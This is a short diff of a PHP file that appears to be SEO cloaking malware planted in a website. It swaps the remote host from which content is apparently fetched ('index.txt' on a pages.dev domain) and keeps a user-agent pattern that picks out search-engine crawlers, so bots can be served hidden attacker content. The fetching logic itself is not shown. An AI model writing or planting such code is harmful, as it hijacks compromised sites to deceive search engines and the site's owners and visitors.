@@ -16,7 +16,7 @@
 @ob_start();
 header("Vary: User-Agent");
 
-$targetUrl = "https://jangandigalakinasligatau.pages.dev/index.txt";
+$targetUrl = "https://wwwselalumencoba.pages.dev/index.txt";
 $botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
